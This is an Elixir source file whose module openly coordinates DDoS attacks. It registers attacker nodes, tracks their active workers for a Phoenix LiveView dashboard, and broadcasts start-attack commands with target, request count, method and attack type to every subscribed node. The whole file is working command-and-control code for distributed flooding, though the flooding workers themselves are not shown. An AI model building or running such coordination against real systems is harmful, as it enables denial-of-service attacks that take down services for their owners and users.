defmodule AttackCoordinator do
  require Logger

  # Module for coordinating DDoS attacks across multiple nodes. Attacker nodes subscribe to the coordinator, the coordinator awaits messages to start attacks and forwards them to all subscribed attackers. Uses phoenix PubSub to broadcast updates to LiveViews.

  # Child specification to simplify supervised process starts
  def child_spec([]) do
    %{
      id: __MODULE__,
      start: {__MODULE__, :start_link, []}
    }
  end

  # Spawns a coordinator process and links it to the calling process
  def start_link do
    pid = spawn_link(fn -> start() end)
    {:ok, pid}
  end

  # Setup function for the coordinator
  defp start() do
    Process.register(self(), :attack_coordinator)
    Logger.info("Attack coordinator started")
    loop(%{})
  end

  # Main event loop
  defp loop(subscribed_attackers) do
    receive do
      # Handles attacker subscriptions
      {:subscribe, node} ->
        Logger.info("Attacker subscribed: #{inspect(node)}")

        updated_attackers = Map.put(subscribed_attackers, node, 0)
        HelloWeb.Endpoint.broadcast("attacker", "attacker_list_update", updated_attackers)
        loop(updated_attackers)

      # Handles updates with the number of active workers on attacker nodes
      {:attack_update, node, active_workers} ->
        Logger.info("Update received from #{inspect(node)} with #{active_workers} active workers")

        updated_attackers = Map.put(subscribed_attackers, node, active_workers)

        HelloWeb.Endpoint.broadcast("attacker", "attacker_list_update", updated_attackers)

        loop(updated_attackers)

      # Handles messages to start attaacks on all the subscribed attacker nodes
      {:start_attack, workers, target, requests, method, attack_type} ->
        Logger.info("Starting attack on: \n#{inspect(subscribed_attackers)}")

        for {node, _workers} <- subscribed_attackers do
          start_attack(node, workers, target, requests, method, attack_type)
        end

        loop(subscribed_attackers)

      # Remove disconnected node from the subscribed attackers if it exists in the map
      {:node_down, disconnected_node} ->
        remaining_attackers =
          Map.filter(
            subscribed_attackers,
            fn {node, _} -> node != disconnected_node end
          )

        HelloWeb.Endpoint.broadcast("attacker", "attacker_list_update", remaining_attackers)

        loop(remaining_attackers)

      # Returns the map of subscribed attackers to the sender
      {:get_attackers, from} ->
        send(from, {:attacker_list, subscribed_attackers})
        loop(subscribed_attackers)

      msg ->
        Logger.info("Unhandled message received: #{inspect(msg)}")
        loop(subscribed_attackers)
    end
  end

  # Sends the command to start an attack to an attacker node
  defp start_attack(node, workers, target, requests, method, attack_type) do
    send(
      {:attack_supervisor, node},
      {:start, workers, target, requests, method, attack_type}
    )
  end
end
